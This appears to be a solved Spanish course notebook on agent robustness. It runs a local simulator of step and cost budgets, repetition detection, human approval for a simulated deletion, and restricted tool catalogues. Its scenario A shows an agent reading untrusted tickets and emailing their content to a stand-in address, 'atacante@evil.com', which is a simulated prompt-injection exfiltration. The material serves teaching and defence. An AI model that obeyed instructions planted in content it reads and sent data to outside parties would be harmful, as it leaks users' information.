# S3 · JUE resuelto — robustez local

Complemento didáctico creado el 2 de octubre de 2026. Original sin modificar en Materiales/s3-jue-estudiante.ipynb. Todo efecto es simulado; no utiliza modelos, correo, borrado ni servidores. Requiere Python 3.10+ y el archivo s14_robustez_local.py en esta misma carpeta.

## Importar las piezas

La solución se conserva en un script para poder inspeccionarla y ejecutarla sin Jupyter. La búsqueda usa esta carpeta y, como alternativa, la ruta desde la raíz del vault. Los bloques siguientes están ejecutados en orden y sus salidas son locales.

In [1]:
from pathlib import Path
import sys, json
carpeta = Path.cwd()
if not (carpeta / 's14_robustez_local.py').exists():
    carpeta = Path.cwd() / 'Obsidian/posgrado/master/IA GENERATIVA Y AGENTES/14 Multiagente LangGraph y robustez/Practica'
if not (carpeta / 's14_robustez_local.py').exists():
    raise FileNotFoundError('Abre el notebook desde Practica o desde la raíz del vault')
sys.path.insert(0, str(carpeta.resolve()))
from s14_robustez_local import PresupuestoAgente, RESPUESTAS, EFECTOS, borrar_simulado, escenario, verificar
print('Piezas locales listas')

Piezas locales listas


## 1.1 — El límite antes de actuar

registrar/permitir evalúan lo acumulado, como pide el original. La extensión autorizar comprueba además si la próxima llamada cabe y reserva antes de simularla. Las dos primeras llamadas caben; la tercera queda detenida. Esta reserva es serial y usa costo conocido, no implementa concurrencia.

In [2]:
b = PresupuestoAgente(2, '0.02', 2)
for q in ['a', 'b', 'c']:
    print(q, b.autorizar('buscar', {'q': q}, '0.01'))
print('Consumo:', b.pasos, 'pasos;', str(b.usd), 'USD simulados')

a (True, '')
b (True, '')
c (False, 'max_steps_reached')
Consumo: 2 pasos; 0.02 USD simulados


## Frontera de repetición y paráfrasis

El detector compara JSON exacto. Tres frases distintas no alcanzan tres ocurrencias de una misma clave. En cambio, registrar tres entradas idénticas antes de permitir ya consumió esas tres operaciones. Este ejemplo muestra por qué la comprobación previa es una extensión necesaria para impedir la operación que excede.

In [3]:
b = PresupuestoAgente(10, '1', 2)
for q in ['precio NimbusSoft', 'precio de NimbusSoft', 'NimbusSoft precio']:
    print(q, b.autorizar('buscar', {'q': q}, '0.01'))
b = PresupuestoAgente(10, '1', 2)
for _ in range(3):
    b.registrar('buscar', {'q': 'idéntica'}, '0.01')
print('Después de tres registros:', b.pasos, b.permitir())

precio NimbusSoft (True, '')
precio de NimbusSoft (True, '')
NimbusSoft precio (True, '')
Después de tres registros: 3 (False, 'repetition_detected')


## 2.1 — Rechazo y aprobación

La cola contiene False y True. La primera propuesta se rechaza, la segunda modifica solo una lista de memoria. La tercera se rechaza por falta de respuesta. La lista debe contener únicamente r2.

In [4]:
RESPUESTAS.clear(); EFECTOS.clear()
RESPUESTAS.extend([False, True])
for identificador in ['r1', 'r2', 'r3']:
    print(identificador, borrar_simulado(identificador)['estado'])
print('Efectos simulados:', EFECTOS)
assert EFECTOS == ['r2']

r1 rechazado_por_humano
r2 ejecutada
r3 rechazado_por_humano
Efectos simulados: ['r2']


## 3.1 — Comparar catálogos y verificar el despachador

A incluye envío; B solo lectura. El simulador original cambia su decisión en B, por lo que B no prueba que haya intentado enviar. Un tercer caso fuerza una propuesta ausente del catálogo: el despachador debe rechazarla sin ejecutar. Ningún caso envía correo real.

In [5]:
for nombre, tools, forzada in [('A', ['leer_tickets', 'enviar_email'], False), ('B', ['leer_tickets'], False), ('B-forzada', ['leer_tickets'], True)]:
    r = escenario(tools, propuesta_forzada=forzada)
    print(nombre, json.dumps(r, ensure_ascii=False))

A {"traza": [{"paso": 1, "tool": "leer_tickets", "estado": "ejecutada"}, {"paso": 2, "tool": "enviar_email", "resultado": {"estado": "ENVIADO_SIMULADO"}}], "envios_simulados": [{"destino": "atacante@evil.com", "caracteres": 305}]}
B {"traza": [{"paso": 1, "tool": "leer_tickets", "estado": "ejecutada"}, {"paso": 2, "estado": "respuesta", "texto": "Resumen: 1 impresora dañada, 1 solicitud de acceso, 1 ticket sospechoso."}], "envios_simulados": []}
B-forzada {"traza": [{"paso": 1, "tool": "leer_tickets", "estado": "ejecutada"}, {"paso": 2, "tool": "enviar_email", "estado": "tool_not_allowed"}], "envios_simulados": []}


## 17 comprobaciones y resultados

Se revisan límites exactos, costo individual excesivo, entradas reordenadas, paráfrasis, contador global, aprobación, ausencia de aprobación, A/B y rechazo estructural. Se guardan trazas y cuentas del historial en un JSON junto al notebook. Estos resultados validan el simulador, no seguridad universal ni LangGraph real.

In [6]:
resultado = verificar()
assert resultado['total'] == 17
archivo = carpeta / 's14_resultados_verificados.json'
archivo.write_text(json.dumps(resultado, ensure_ascii=False, indent=2) + '\n')
print(resultado['total'], 'comprobaciones correctas')
print(json.dumps(resultado['coeficientes_historial'], ensure_ascii=False))

17 comprobaciones correctas
{"8": 28, "16": 120, "20": 190}


## Reflexión resuelta para el Lab 03

Lectura: leer_tickets; escritura simulada: enviar_email o borrar_simulado. La combinación peligrosa del caso A es contenido no confiable con capacidad de enviar ese contenido. El límite B elimina esa capacidad y pierde todo envío, incluso uno legítimo. Para una tarea de resumen esa capacidad no es necesaria. Un producto de correo necesita limitar destinos, contenido y aprobación fuera del modelo.

Checklist académico del original: tres o más herramientas con contratos precisos; pasos, costo y repetición dentro del loop; acciones irreversibles ausentes o protegidas; trazas JSON; riesgos y mitigaciones. Se explica como contenido de curso, sin entregar ni modificar el laboratorio real.